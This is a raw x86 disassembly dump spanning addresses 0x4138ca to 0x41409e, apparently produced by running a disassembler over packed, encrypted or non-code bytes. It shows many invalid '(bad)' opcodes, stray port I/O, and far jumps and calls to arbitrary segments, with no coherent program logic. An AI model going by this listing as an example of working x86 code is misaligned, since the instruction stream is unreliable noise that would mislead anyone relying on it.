  4138ca:	(bad)  
  4138cb:	and    BYTE PTR [ebx+0x76],bl
  4138ce:	sub    BYTE PTR [esi+0x23e3d4a8],0x79
  4138d5:	rol    dh,cl
  4138d7:	ret    0x454
  4138da:	sar    cl,cl
  4138dc:	fdivr  QWORD PTR [ebp-0x5b]
  4138df:	icebp  
  4138e0:	enter  0x4c97,0x2f
  4138e4:	mov    dl,0xbb
  4138e6:	mov    ah,0xe8
  4138e8:	test   eax,0xafeec180
  4138ed:	stos   DWORD PTR es:[edi],eax
  4138ee:	mov    ebx,?
  4138f0:	jg     0x413921
  4138f2:	stos   BYTE PTR es:[edi],al
  4138f3:	jmp    0xd5d8:0x3ba61617
  4138fa:	aad    0x65
  4138fc:	js     0x4138e8
  4138fe:	add    al,0xf7
  413900:	jmp    0xc121ec06
  413905:	test   BYTE PTR [edi-0x11b87b28],cl
  41390b:	sub    ecx,esi
  41390d:	ds dec edx
  41390f:	aam    0x90
  413911:	mov    dh,0x69
  413913:	xchg   ebx,eax
  413914:	pusha  
  413915:	in     al,dx
  413916:	es (bad) 
  413918:	jo     0x41391d
  41391a:	stc    
  41391b:	std    
  41391c:	mov    ebx,0x9ea7bb94
  413921:	ror    BYTE PTR [edi],0xb1
  413924:	(bad)  
  413925:	dec    ecx
  413926:	dec    edi
  413927:	xchg   dl,al
  413929:	xor    eax,0x444c8567
  41392e:	test   DWORD PTR [ebx-0x5f],edx
  413931:	dec    esp
  413932:	pop    eax
  413933:	dec    esi
  413934:	jl     0x413960
  413936:	lahf   
  413937:	add    al,0x64
  413939:	ss cwde 
  41393b:	div    DWORD PTR [ecx-0x4eb773d8]
  413941:	mov    bh,BYTE PTR [edi-0x750ba2d0]
  413947:	push   ss
  413948:	stc    
  413949:	jb     0x413976
  41394b:	mov    ebp,0x90011010
  413950:	in     eax,0x48
  413952:	adc    edi,DWORD PTR [ebp+ebp*1+0x7f]
  413956:	out    0x29,eax
  413958:	add    eax,0xdbfeef00
  41395d:	scas   eax,DWORD PTR es:[edi]
  41395e:	bound  eax,QWORD PTR [ecx+0x31]
  413961:	adc    eax,0x8a898993
  413966:	adc    ch,BYTE PTR [edx-0x51]
  413969:	adc    ecx,eax
  41396b:	jns    0x41398c
  41396d:	addr16 mov ah,0x2a
  413970:	pushf  
  413971:	jo     0x4139e2
  413973:	or     eax,DWORD PTR [ebp*2-0x834701d]
  41397a:	dec    edi
  41397b:	adc    DWORD PTR [ebx-0x4c],ebp
  41397e:	xchg   BYTE PTR [esi+0x1740a31],cl
  413984:	enter  0xfff2,0x2d
  413988:	sahf   
  413989:	mov    ah,0x8e
  41398b:	dec    eax
  41398c:	mov    eax,ds:0xd743f3b
  413991:	out    0x7c,al
  413993:	int3   
  413994:	xor    eax,0xd7ea36a1
  413999:	shl    BYTE PTR [esi+0x4878affe],1
  41399f:	xchg   DWORD PTR [edx+edi*1-0x2fe3d4d1],ecx
  4139a6:	aam    0xd1
  4139a8:	call   0x95f3:0xede9f35e
  4139af:	mov    edx,0x3f315442
  4139b4:	jp     0x413947
  4139b6:	add    esi,DWORD PTR [edx+0x5d]
  4139b9:	les    eax,FWORD PTR [edi+0x14]
  4139bc:	loope  0x4139c6
  4139be:	int    0x9
  4139c0:	test   BYTE PTR [ecx-0x1b0fa895],bh
  4139c6:	push   edi
  4139c7:	and    eax,0x6814d228
  4139cc:	mov    eax,ds:0x56087596
  4139d1:	(bad)  
  4139d2:	mov    ch,0x67
  4139d4:	jnp    0x413a40
  4139d6:	fimul  WORD PTR [edi-0x1ef93310]
  4139dc:	mov    cl,0x75
  4139de:	adc    BYTE PTR [ecx+0xe445c52],dl
  4139e4:	xchg   esi,eax
  4139e5:	pop    ecx
  4139e6:	jmp    0x413980
  4139e8:	jp     0x41397b
  4139ea:	mov    ecx,DWORD PTR [edi+esi*1+0x65]
  4139ee:	call   DWORD PTR [eax-0x67ec30c8]
  4139f4:	nop
  4139f5:	popf   
  4139f6:	popw   ds
  4139f8:	test   BYTE PTR [esi],0x8b
  4139fb:	jo     0x4139fb
  4139fd:	mov    ?,WORD PTR [edi]
  4139ff:	cmp    esi,DWORD PTR fs:[ebx-0x67]
  413a03:	xchg   esp,eax
  413a04:	add    bh,al
  413a06:	xor    cl,BYTE PTR [ebx-0x62e07f9e]
  413a0c:	push   ss
  413a0d:	arpl   WORD PTR [ecx-0xfd2d760],ax
  413a13:	mov    ch,0xdb
  413a15:	test   al,0x13
  413a17:	pop    edx
  413a18:	push   ecx
  413a19:	mov    dl,ch
  413a1b:	adc    al,0x7c
  413a1d:	mov    bh,0x4
  413a1f:	outs   dx,BYTE PTR ds:[esi]
  413a20:	call   0x2f4be4ad
  413a25:	imul   eax,DWORD PTR [edx+0x46],0x65d84095
  413a2c:	(bad)  
  413a2d:	mov    al,0xff
  413a2f:	data16 into 
  413a31:	popf   
  413a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a33:	fidiv  WORD PTR [ebx-0x8]
  413a36:	mov    esp,DWORD PTR [esi+0x5b]
  413a39:	push   esi
  413a3a:	lods   eax,DWORD PTR ds:[esi]
  413a3b:	popf   
  413a3c:	and    al,0x17
  413a3e:	addr16 mov esi,0xe3fe1233
  413a44:	aas    
  413a45:	sbb    al,0xb7
  413a47:	dec    ebp
  413a48:	imul   esp,DWORD PTR [ebp+esi*2+0x22],0x27b5d692
  413a50:	sbb    DWORD PTR [ecx],ebp
  413a52:	mov    ds:0xde101da,al
  413a57:	push   ss
  413a58:	call   0xb032a6
  413a5d:	dec    ecx
  413a5e:	les    esi,FWORD PTR [ebx+0x1b0a85c5]
  413a64:	jns    0x413a0e
  413a66:	out    0x8e,al
  413a68:	and    DWORD PTR [edi],0x84164081
  413a6e:	xchg   ebx,eax
  413a6f:	cmp    eax,0x5181e0f6
  413a74:	push   cs
  413a75:	shr    BYTE PTR [ecx-0xbb82e04],1
  413a7b:	mov    al,0xcf
  413a7d:	stc    
  413a7e:	shl    eax,1
  413a80:	les    edx,FWORD PTR [ebx+0x2687f396]
  413a86:	xchg   edi,eax
  413a87:	jmp    0xa2d9:0x292a61ab
  413a8e:	adc    DWORD PTR [edi+0x4b],0x1
  413a92:	xor    BYTE PTR [ebx-0x15],dl
  413a95:	in     al,dx
  413a96:	dec    ah
  413a98:	repz addr16 jp 0x413af4
  413a9c:	add    al,0xda
  413a9e:	hlt    
  413a9f:	push   ss
  413aa0:	in     al,0x3f
  413aa2:	pop    eax
  413aa3:	jecxz  0x413a9f
  413aa5:	jecxz  0x413a30
  413aa7:	aad    0x42
  413aa9:	mov    eax,ds:0x775f970a
  413aae:	shl    ebx,0xc1
  413ab1:	lds    esi,FWORD PTR [ebx-0x6969b96]
  413ab7:	das    
  413ab8:	add    al,0x6d
  413aba:	mov    al,ds:0x15083b97
  413abf:	out    dx,al
  413ac0:	fmulp  st(0),st
  413ac2:	sbb    DWORD PTR [edx+esi*2-0x3a821a0],ebp
  413ac9:	mov    BYTE PTR [eax],dl
  413acb:	mov    eax,ds:0xa7ab81d4
  413ad0:	into   
  413ad1:	mov    edi,0xa997747d
  413ad6:	das    
  413ad7:	add    dh,dl
  413ad9:	and    bh,BYTE PTR [ecx+0x23e3e2f5]
  413adf:	inc    ebx
  413ae0:	fiadd  DWORD PTR [edx+0x54]
  413ae3:	push   edx
  413ae4:	jmp    0x855dd000
  413ae9:	mov    al,ds:0x20b54b86
  413aee:	jbe    0x413b37
  413af0:	loope  0x413a86
  413af2:	(bad)  
  413af3:	xor    BYTE PTR [ecx-0x5e8b4d12],bh
  413af9:	out    dx,al
  413afa:	shr    ecx,0x93
  413afd:	sbb    ch,dh
  413aff:	sub    DWORD PTR [ecx+0x58],eax
  413b02:	or     al,0x8a
  413b04:	iret   
  413b05:	test   DWORD PTR [eax+0x68386ddd],0x83303012
  413b0f:	sbb    ecx,DWORD PTR [ebp-0x5]
  413b12:	mov    cl,0x4b
  413b14:	push   ss
  413b15:	test   BYTE PTR [ebp+edx*2+0x3d],0xc4
  413b1a:	shl    dh,0xf0
  413b1d:	inc    esp
  413b1e:	xlat   BYTE PTR ds:[ebx]
  413b1f:	mov    ch,0x4e
  413b21:	cld    
  413b22:	pop    eax
  413b23:	test   al,0x57
  413b25:	je     0x413b02
  413b27:	(bad)  
  413b28:	cld    
  413b29:	xor    BYTE PTR [edi+0x6621aa82],dh
  413b2f:	ss mov eax,0xcab43c59
  413b35:	bound  edi,QWORD PTR [eax+0x77]
  413b38:	pop    es
  413b39:	dec    esi
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	mov    cl,0x5e
  413b3d:	dec    esi
  413b3e:	dec    ecx
  413b3f:	lds    edx,FWORD PTR [ebp+0x79c7cd17]
  413b45:	(bad)  
  413b46:	in     al,dx
  413b47:	icebp  
  413b48:	inc    ebx
  413b49:	push   edx
  413b4a:	int3   
  413b4b:	sub    DWORD PTR [ebp-0x557449ef],0x26bbbde3
  413b55:	outs   dx,BYTE PTR ds:[esi]
  413b56:	mov    ebx,0x70b9b9ce
  413b5b:	(bad)  
  413b5c:	call   0x98ef:0x7058397b
  413b63:	pop    es
  413b64:	pop    ebx
  413b65:	add    BYTE PTR [edi-0x1e2fae4],0xf5
  413b6c:	ds pop ebp
  413b6e:	rcl    bl,1
  413b70:	and    BYTE PTR [ecx],dl
  413b72:	idiv   BYTE PTR [edi]
  413b74:	inc    esi
  413b75:	pop    ebx
  413b76:	xchg   ebx,eax
  413b77:	and    BYTE PTR [ecx],bl
  413b79:	pop    ss
  413b7a:	(bad)  
  413b7b:	aad    0x4b
  413b7d:	fdivr  st,st(2)
  413b7f:	in     eax,0xc4
  413b81:	xor    bl,BYTE PTR [edi+0x7c]
  413b84:	add    eax,0xe68a9955
  413b89:	hlt    
  413b8a:	mov    BYTE PTR [esi-0x729df876],bh
  413b90:	mov    dh,0x41
  413b92:	test   BYTE PTR [edi+0x58f8393e],bh
  413b98:	push   esp
  413b99:	lock jnp 0x413bd0
  413b9c:	add    BYTE PTR [eax],dl
  413b9e:	lahf   
  413b9f:	inc    eax
  413ba0:	dec    esi
  413ba1:	repz jp 0x413b27
  413ba4:	push   esp
  413ba5:	int3   
  413ba6:	push   eax
  413ba7:	and    BYTE PTR [edi+0x6f2ff6b8],0x76
  413bae:	push   0xe10edce5
  413bb3:	mov    ecx,0x822c7f9a
  413bb8:	jmp    0x413bd2
  413bba:	xchg   DWORD PTR [edx+0x20],esp
  413bbd:	pop    es
  413bbe:	push   esi
  413bbf:	or     dh,bl
  413bc1:	add    esi,esi
  413bc3:	add    dh,BYTE PTR [eax+0x3bb31672]
  413bc9:	call   0x3960:0xed66c646
  413bd0:	loopne 0x413b8b
  413bd2:	sub    al,0xfa
  413bd4:	icebp  
  413bd5:	push   es
  413bd6:	outs   dx,DWORD PTR ds:[esi]
  413bd7:	push   edi
  413bd8:	shl    DWORD PTR [ecx],1
  413bda:	xor    DWORD PTR [edi+0x61],ebp
  413bdd:	cs mov dl,0x8
  413be0:	mov    es,WORD PTR [ebx]
  413be2:	pop    esp
  413be3:	pop    edx
  413be4:	test   al,0x4d
  413be6:	mov    al,0x24
  413be8:	mov    ebx,ebp
  413bea:	aad    0x51
  413bec:	scas   eax,DWORD PTR es:[edi]
  413bed:	xchg   ebx,eax
  413bee:	(bad)  
  413bef:	mov    DWORD PTR [ecx+0x1],eax
  413bf2:	mov    eax,ds:0x25feccc5
  413bf7:	in     al,0x0
  413bf9:	scas   al,BYTE PTR es:[edi]
  413bfa:	ins    BYTE PTR es:[edi],dx
  413bfb:	outs   dx,BYTE PTR ds:[esi]
  413bfc:	popf   
  413bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bfe:	and    eax,0x3a67d743
  413c03:	xchg   esp,eax
  413c04:	push   cs
  413c05:	adc    ch,BYTE PTR [edi+ebp*2]
  413c08:	into   
  413c09:	and    eax,edi
  413c0b:	(bad)  
  413c0c:	pop    esp
  413c0d:	xor    al,al
  413c0f:	inc    BYTE PTR [ecx+0x5324f8b9]
  413c15:	test   al,0x1b
  413c17:	add    eax,edi
  413c19:	jmp    0xda9623ee
  413c1e:	imul   edi,DWORD PTR [edi-0x3d],0xfffffff3
  413c22:	add    DWORD PTR [esi+eiz*4+0x63],esi
  413c26:	xchg   edx,eax
  413c27:	pop    ss
  413c28:	xlat   BYTE PTR ds:[ebx]
  413c29:	mov    edi,fs
  413c2b:	fist   DWORD PTR [ecx]
  413c2d:	sbb    eax,0x6a6bd971
  413c32:	inc    ecx
  413c33:	cmp    esi,edx
  413c35:	out    0xb4,al
  413c37:	xchg   BYTE PTR [ebp+0x2a],dl
  413c3a:	or     cl,BYTE PTR [esi]
  413c3c:	mov    edx,0x2845cdff
  413c41:	add    esi,DWORD PTR gs:[ecx]
  413c44:	inc    ebx
  413c45:	fsubr  st(7),st
  413c47:	into   
  413c48:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  413c4a:	repnz push 0xd9691ce4
  413c50:	mov    bl,0xde
  413c52:	in     eax,dx
  413c53:	inc    ecx
  413c54:	mov    ah,0xbb
  413c56:	lds    edi,FWORD PTR [ebx+0x4aa0fc5b]
  413c5c:	pop    es
  413c5d:	mov    BYTE PTR [edx-0x3f],dl
  413c60:	out    dx,al
  413c61:	rol    esi,0x69
  413c64:	push   ss
  413c65:	mov    ebp,ecx
  413c67:	sub    BYTE PTR [ebp-0x76d659e6],bh
  413c6d:	out    0x28,al
  413c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c70:	out    dx,al
  413c71:	mov    eax,ds:0xb5edf490
  413c76:	jmp    FWORD PTR [edi-0x1f]
  413c79:	nop
  413c7a:	fld    QWORD PTR [esi]
  413c7c:	add    dh,BYTE PTR [ebx]
  413c7e:	mov    ebx,0xb73b60a1
  413c83:	sbb    BYTE PTR [edx],0xda
  413c86:	pop    cx
  413c88:	adc    DWORD PTR [ebp+0xc],0x58
  413c8c:	and    ebx,DWORD PTR [edi]
  413c8e:	inc    ebx
  413c8f:	rcl    dl,0x89
  413c92:	retf   0xfc48
  413c95:	adc    al,0x29
  413c97:	bound  esp,QWORD PTR [ecx+esi*8]
  413c9a:	test   WORD PTR [edi-0x69],0x7d4c
  413ca0:	iret   
  413ca1:	fimul  WORD PTR ds:[edi+0x230eabe6]
  413ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ca9:	xor    cl,BYTE PTR [esi-0x73f818d2]
  413caf:	call   0x8a41:0x5349d4be
  413cb6:	jle    0x413cf1
  413cb8:	xchg   ebp,eax
  413cb9:	pusha  
  413cba:	cld    
  413cbb:	mov    eax,ds:0xc375ed3a
  413cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc1:	xchg   ebx,eax
  413cc2:	jmp    0x1935:0x13f7e66f
  413cc9:	push   cs
  413cca:	cmp    esp,eax
  413ccc:	push   esp
  413ccd:	in     al,0x78
  413ccf:	in     al,0xa4
  413cd1:	out    0x93,al
  413cd3:	bound  eax,QWORD PTR ds:0x31899297
  413cd9:	(bad)  [ebx-0x2ee3f13e]
  413cdf:	push   edx
  413ce0:	inc    ebp
  413ce1:	xchg   ecx,eax
  413ce2:	mov    dh,0x70
  413ce4:	and    ebx,DWORD PTR [esi-0x2a6a7de1]
  413cea:	sar    BYTE PTR [ecx],0x51
  413ced:	int3   
  413cee:	jbe    0x413d34
  413cf0:	loopne 0x413d39
  413cf2:	sti    
  413cf3:	aad    0x67
  413cf5:	test   BYTE PTR [ecx+edi*4],bl
  413cf8:	mov    edx,0x6e9062f6
  413cfd:	je     0x413d0f
  413cff:	rol    DWORD PTR [ecx],1
  413d01:	inc    esp
  413d02:	imul   ah
  413d04:	xor    DWORD PTR [ebx+ebp*8-0x16],ebp
  413d08:	xor    ecx,DWORD PTR [esp+esi*8-0xd4e6413]
  413d0f:	clc    
  413d10:	mov    ds:0x5dc2734c,eax
  413d15:	fwait
  413d16:	or     BYTE PTR [ebx],0x73
  413d19:	push   cs
  413d1a:	xchg   DWORD PTR [esi-0x4b],ebx
  413d1d:	fucomp st(2)
  413d1f:	scas   al,BYTE PTR es:[edi]
  413d20:	ja     0x413d85
  413d22:	mov    edi,0xc1f4230a
  413d27:	loop   0x413d95
  413d29:	mov    ds:0x24ba2818,eax
  413d2e:	xor    ecx,DWORD PTR [ebx]
  413d30:	mov    dl,0x16
  413d32:	xor    eax,0x44cb0a16
  413d37:	xor    edx,DWORD PTR ds:0x52bed1f6
  413d3d:	test   DWORD PTR [ecx+0x5a2c827d],edx
  413d43:	scas   eax,DWORD PTR es:[edi]
  413d44:	xchg   ecx,eax
  413d45:	aam    0xd9
  413d47:	mov    ebx,0xc1df80b5
  413d4c:	mov    cl,0x21
  413d4e:	retf   0x8da1
  413d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d52:	cdq    
  413d53:	loope  0x413d3a
  413d55:	sbb    BYTE PTR [ecx],dh
  413d57:	and    ebp,ebx
  413d59:	adc    DWORD PTR [edi+0x1d1937d2],ebx
  413d5f:	add    esp,DWORD PTR [ebp+0x7e]
  413d62:	xor    eax,0x163d8f0b
  413d67:	pop    ecx
  413d68:	push   edi
  413d69:	into   
  413d6a:	dec    ecx
  413d6b:	(bad)  
  413d6c:	dec    eax
  413d6d:	lods   eax,DWORD PTR ds:[esi]
  413d6e:	jno    0x413dd2
  413d70:	push   esi
  413d71:	and    esi,eax
  413d73:	sti    
  413d74:	or     cl,ah
  413d76:	push   ecx
  413d77:	bound  esp,QWORD PTR [esi]
  413d79:	mov    esi,0x745685d3
  413d7e:	es xchg edi,eax
  413d80:	cmp    eax,0xc464c381
  413d85:	mov    DWORD PTR [esi-0x53],edi
  413d88:	sbb    al,0x6
  413d8a:	xor    DWORD PTR [esi+0x4f],esi
  413d8d:	cdq    
  413d8e:	pusha  
  413d8f:	ins    BYTE PTR es:[edi],dx
  413d90:	lds    eax,FWORD PTR [eax-0x61]
  413d93:	ins    BYTE PTR es:[edi],dx
  413d94:	test   BYTE PTR [edi],bl
  413d96:	add    al,BYTE PTR [ecx-0x7]
  413d99:	jge    0x413d9b
  413d9b:	mov    eax,ds:0xa7252b41
  413da0:	shl    BYTE PTR [bx],1
  413da3:	inc    ecx
  413da4:	mov    DWORD PTR [esi-0x21520fe9],edi
  413daa:	sub    BYTE PTR [eax-0x2f4635c1],0xfb
  413db1:	adc    al,0x52
  413db3:	mov    DWORD PTR [eax+0x28],esp
  413db6:	push   ecx
  413db7:	outs   dx,BYTE PTR ds:[esi]
  413db8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413db9:	or     bl,BYTE PTR [eax+0x6fdd06ed]
  413dbf:	sti    
  413dc0:	and    al,0x2e
  413dc2:	jmp    0x8a9f815
  413dc7:	jge    0x413d5d
  413dc9:	mov    DWORD PTR [ecx-0x40df019e],ecx
  413dcf:	fdivr  QWORD PTR cs:[esi+0x64ab5959]
  413dd6:	js     0x413df0
  413dd8:	sub    eax,0xa7dbc2f
  413ddd:	dec    edx
  413dde:	retf   
  413ddf:	fsubr  st(5),st
  413de1:	fisub  WORD PTR [edi+0x7a898899]
  413de7:	neg    DWORD PTR [ecx+esi*2+0x22]
  413deb:	and    ah,ah
  413ded:	pop    edi
  413dee:	add    BYTE PTR [eax+0xe],al
  413df1:	add    dh,BYTE PTR [esi+0x37]
  413df4:	jnp    0x413d9e
  413df6:	loopne 0x413e67
  413df8:	xchg   ecx,eax
  413df9:	dec    esp
  413dfb:	in     eax,0xf7
  413dfd:	dec    ebp
  413dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dff:	cdq    
  413e00:	lods   eax,DWORD PTR ds:[esi]
  413e01:	pop    es
  413e02:	sub    edi,DWORD PTR [esi]
  413e04:	cs out 0x34,al
  413e07:	into   
  413e08:	sub    eax,eax
  413e0a:	sub    dl,BYTE PTR [edi-0x4]
  413e0d:	xchg   BYTE PTR [ecx],bl
  413e0f:	or     BYTE PTR [ebx+0x3e],0xf4
  413e13:	pusha  
  413e14:	ja     0x413e81
  413e16:	lods   eax,DWORD PTR ds:[esi]
  413e17:	mov    cl,0x5f
  413e19:	popa   
  413e1a:	sub    BYTE PTR [ebx-0x30722a2d],bl
  413e20:	in     al,0x20
  413e22:	mov    dh,0x76
  413e24:	mov    al,ds:0xd487edf8
  413e29:	(bad)  
  413e2a:	aas    
  413e2b:	call   0x1bf851bf
  413e30:	mov    BYTE PTR [eax+esi*4+0xd],dh
  413e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e35:	jp     0x413e46
  413e37:	and    eax,0xc8bf6b89
  413e3c:	cmp    edi,DWORD PTR [edi+esi*1-0x16f59e07]
  413e43:	test   BYTE PTR [ecx-0x74456a2],0x37
  413e4a:	shl    DWORD PTR [ebx+ecx*4],cl
  413e4d:	mov    bh,0xe5
  413e4f:	inc    edi
  413e50:	enter  0xb860,0xb4
  413e54:	xchg   ebp,eax
  413e55:	pop    esp
  413e56:	cld    
  413e57:	jl     0x413e8e
  413e59:	push   edi
  413e5a:	dec    edx
  413e5b:	and    eax,0xce4c7c0d
  413e60:	outs   dx,DWORD PTR ds:[esi]
  413e61:	inc    ebp
  413e62:	daa    
  413e63:	lods   al,BYTE PTR ds:[esi]
  413e64:	ja     0x413e9e
  413e66:	cmc    
  413e67:	arpl   WORD PTR [ebp+0x78de1023],sp
  413e6d:	outs   dx,BYTE PTR ds:[esi]
  413e6e:	mov    esp,0x4208d2d4
  413e73:	or     ah,BYTE PTR ds:0x9c526aa1
  413e79:	inc    eax
  413e7a:	lods   eax,DWORD PTR ds:[esi]
  413e7b:	lock sbb BYTE PTR [ecx-0x18],dh
  413e7f:	push   cs
  413e80:	ds xchg esp,eax
  413e82:	mov    bh,0xf9
  413e84:	mov    ah,0xf4
  413e86:	pop    edi
  413e87:	mov    ecx,0x5b06e7f6
  413e8c:	jnp    0xa1546e93
  413e92:	pop    ecx
  413e93:	inc    esp
  413e94:	and    DWORD PTR [edi+0x6b5bdbe6],ebx
  413e9a:	cmp    ecx,DWORD PTR [ebx-0x27]
  413e9d:	mov    ebx,DWORD PTR [ecx+eax*1]
  413ea0:	or     eax,0xdf62aa97
  413ea5:	call   0x31f0:0xfc7a6fb2
  413eac:	sbb    eax,0x13c402c2
  413eb1:	jb     0x413ea3
  413eb3:	ss mov dl,0x8e
  413eb6:	loopne 0x413e5a
  413eb8:	push   eax
  413eb9:	add    al,0x5e
  413ebb:	dec    ecx
  413ebc:	(bad)  
  413ebd:	sti    
  413ebe:	gs clc 
  413ec0:	lahf   
  413ec1:	fimul  DWORD PTR [edx-0x11]
  413ec4:	cli    
  413ec5:	sbb    DWORD PTR [eax-0x1d860235],ebp
  413ecb:	mov    edx,0x8bf756a5
  413ed0:	jmp    DWORD PTR [eax+0x5b]
  413ed3:	mov    DWORD PTR [ebp+0x2b],0xc1cdc792
  413eda:	push   edx
  413edb:	sbb    DWORD PTR es:[ebx-0x30],edi
  413edf:	rol    BYTE PTR [ebp+0x48],1
  413ee2:	and    ecx,edx
  413ee4:	daa    
  413ee5:	inc    edi
  413ee6:	loopne 0x413e8d
  413ee8:	loop   0x413f35
  413eea:	dec    ebx
  413eeb:	repnz push edx
  413eed:	aam    0x7
  413eef:	pop    edx
  413ef0:	jae    0x413e86
  413ef2:	or     edx,DWORD PTR [eax-0x412d8040]
  413ef8:	mov    di,WORD PTR [edi]
  413efb:	mov    ah,0x74
  413efd:	mov    bh,0xce
  413eff:	mov    eax,0xbdaa70e8
  413f04:	cmp    BYTE PTR [edi],bl
  413f06:	das    
  413f07:	pop    edi
  413f08:	mov    WORD PTR [edi-0x258f6906],?
  413f0e:	or     bh,ch
  413f10:	out    0xd2,eax
  413f12:	mov    ebx,0x599289c9
  413f17:	and    ebx,eax
  413f19:	arpl   WORD PTR [ebx-0x1a],cx
  413f1c:	push   0x21ac37e6
  413f21:	jl     0x413f03
  413f23:	sbb    al,BYTE PTR [ebp-0x2a579a76]
  413f29:	icebp  
  413f2a:	out    0xb9,al
  413f2c:	and    ah,BYTE PTR [edi]
  413f2e:	call   0x6cdf:0xafcdef66
  413f35:	sar    DWORD PTR [esi+0x2f77dbc3],cl
  413f3b:	add    al,0x73
  413f3d:	add    DWORD PTR [edi-0x6d],esi
  413f40:	aam    0x3a
  413f42:	push   esi
  413f43:	loopne 0x413ed0
  413f45:	icebp  
  413f46:	(bad)  
  413f47:	into   
  413f48:	sti    
  413f49:	fisubr WORD PTR [ecx]
  413f4b:	fild   QWORD PTR [eax-0x43]
  413f4e:	mov    esi,0x643c02be
  413f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f54:	pop    es
  413f55:	push   ebx
  413f56:	scas   al,BYTE PTR es:[edi]
  413f57:	sub    al,0x9e
  413f59:	call   0xcd85cff6
  413f5e:	ins    DWORD PTR es:[edi],dx
  413f5f:	jo     0x413fc4
  413f61:	mov    ds:0xdd5620fb,al
  413f66:	cdq    
  413f67:	adc    al,0x4c
  413f69:	jno    0x413fca
  413f6b:	out    0x7d,eax
  413f6d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  413f6f:	mov    esi,edx
  413f71:	or     cl,BYTE PTR [edx]
  413f73:	push   ecx
  413f74:	xchg   edx,eax
  413f75:	lahf   
  413f76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f77:	mov    bl,0x93
  413f79:	jns    0x413fda
  413f7b:	jg     0x413f3c
  413f7d:	dec    edx
  413f7e:	jmp    0x3529636
  413f83:	or     esp,edi
  413f85:	mov    ah,0xff
  413f87:	jp     0x413f8d
  413f89:	les    eax,FWORD PTR [esi+0x6]
  413f8c:	sahf   
  413f8d:	sub    dl,0x8
  413f90:	sub    eax,0x265b73a
  413f95:	aam    0x1e
  413f97:	jmp    0x57de:0x979d7aae
  413f9e:	jae    0x413f21
  413fa0:	xor    ah,BYTE PTR [edi+0x4e]
  413fa3:	(bad)  
  413fa4:	int3   
  413fa5:	inc    edx
  413fa6:	fwait
  413fa7:	sbb    eax,0xaa2e7d8b
  413fac:	jg     0x41402c
  413fae:	lods   al,BYTE PTR ds:[esi]
  413faf:	mov    edx,0x97702c67
  413fb4:	aas    
  413fb5:	add    edx,ebx
  413fb7:	int    0x4
  413fb9:	cmp    BYTE PTR [edi-0x69],ch
  413fbc:	jmp    0xd9421b0e
  413fc1:	loopne 0x413fd3
  413fc3:	out    0x23,al
  413fc5:	addr16 retf 
  413fc7:	add    edx,DWORD PTR [ecx+0x1d]
  413fca:	mov    dh,BYTE PTR [edx+0x40]
  413fcd:	rcl    DWORD PTR [ecx],0x81
  413fd0:	gs adc eax,0x415b849a
  413fd6:	test   DWORD PTR [edi+eax*2],edx
  413fd9:	sbb    BYTE PTR [edx-0x6d],bl
  413fdc:	xchg   esp,eax
  413fdd:	inc    edi
  413fde:	inc    esp
  413fdf:	into   
  413fe0:	jge    0x413f70
  413fe2:	pop    ebx
  413fe3:	cmp    eax,0xe2cc8a4
  413fe8:	xchg   ecx,eax
  413fe9:	rcr    BYTE PTR [ebx-0x64d7f04f],cl
  413fef:	mov    ebp,0x8cd4e561
  413ff4:	xlat   BYTE PTR ds:[ebx]
  413ff5:	out    dx,al
  413ff6:	push   edi
  413ff7:	mov    al,ds:0x4c2f3c0e
  413ffc:	out    dx,eax
  413ffd:	pop    esi
  413ffe:	test   DWORD PTR [eax],0x74792659
  414004:	jbe    0x413ffa
  414006:	rcr    BYTE PTR [edx],1
  414008:	xor    ch,BYTE PTR [eax+esi*2]
  41400b:	ret    0xdf06
  41400e:	fsubr  QWORD PTR [esi-0x68]
  414011:	xchg   esi,eax
  414012:	sbb    BYTE PTR [eax],dl
  414014:	add    esi,edx
  414016:	stos   BYTE PTR es:[edi],al
  414017:	adc    BYTE PTR [edi-0xad73c30],0x7a
  41401e:	jno    0x414053
  414020:	cmp    bl,ah
  414022:	in     eax,0xe8
  414024:	sbb    al,0x17
  414026:	inc    eax
  414027:	xor    edx,edx
  414029:	neg    BYTE PTR [ecx-0x15e2a284]
  41402f:	add    DWORD PTR [ebx-0x1c28f89a],eax
  414035:	adc    BYTE PTR [esi-0x3a94e05d],dl
  41403b:	fdiv   QWORD PTR [ebx+0x322ae6a6]
  414041:	gs inc ecx
  414043:	mov    esi,ss
  414045:	xchg   esp,eax
  414046:	imul   ecx,DWORD PTR [ecx-0x613bde40],0x38
  41404d:	jb     0x41401c
  41404f:	lock mov DWORD PTR ds:[edi],edi
  414053:	jne    0x413fe1
  414055:	and    ch,al
  414057:	pop    esp
  414058:	inc    edi
  414059:	adc    eax,0xe19a8a4e
  41405e:	fwait
  41405f:	ret    0x4b7b
  414062:	mov    WORD PTR [eax+edi*4],es
  414065:	js     0x414085
  414067:	cmp    bh,BYTE PTR [esi+0x6e]
  41406a:	ins    DWORD PTR es:[edi],dx
  41406b:	cmp    ecx,edx
  41406d:	mov    DWORD PTR [ecx-0x56],edi
  414070:	test   al,0x2e
  414072:	inc    edi
  414073:	sub    ecx,esp
  414075:	jp     0x41402a
  414077:	shl    ebp,cl
  414079:	push   ebx
  41407a:	add    esp,ecx
  41407c:	cmp    eax,0x10ad236b
  414081:	pusha  
  414082:	cli    
  414083:	cdq    
  414084:	cs int 0x8
  414087:	popa   
  414088:	sub    cl,BYTE PTR [ebx+0x2f]
  41408b:	faddp  st(4),st
  41408d:	lea    ebp,[eax]
  41408f:	fsubr  QWORD PTR [esi+0x34]
  414092:	imul   esi,DWORD PTR [ebx],0x4e54c3b6
  414098:	scas   eax,DWORD PTR es:[edi]
  414099:	loop   0x414057
  41409b:	daa    
  41409c:	jg     0x41402c
  41409e:	adc    esp,DWORD PTR ds:0x15ebc26f
